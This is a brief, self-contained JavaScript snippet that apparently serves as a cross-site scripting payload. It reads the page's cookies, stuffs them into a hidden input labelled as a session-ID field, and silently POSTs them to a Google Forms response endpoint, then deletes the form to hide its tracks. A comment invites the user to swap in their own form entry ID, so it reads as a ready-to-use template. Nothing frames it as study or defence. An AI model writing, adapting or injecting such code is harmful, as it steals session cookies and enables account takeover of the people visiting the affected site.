(function() {
  // Create a new form element
  const form = document.createElement('form');
  form.action = 'https://docs.google.com/forms/d/e/1FAIpQLScrqCU4iKx8zTSc4ROwM7VB-mf08_iIbNF1LSAhlckrSsC38Q/formResponse';
  form.method = 'POST';
  form.target = '_blank'; // Opens the submission in a new tab
  form.style.display = 'none';

 const test = document.cookie;
  // Create an input element for the 'sessionid' field
  const input = document.createElement('input');
  input.type = 'hidden';
  input.name = 'entry.408018936'; // Replace with your actual entry ID
  input.value = test;

  // Append the input to the form
  form.appendChild(input);

  // Append the form to the document body and submit it
  document.body.appendChild(form);
  form.submit();

  // Optionally, remove the form from the document after submission
  document.body.removeChild(form);
})();
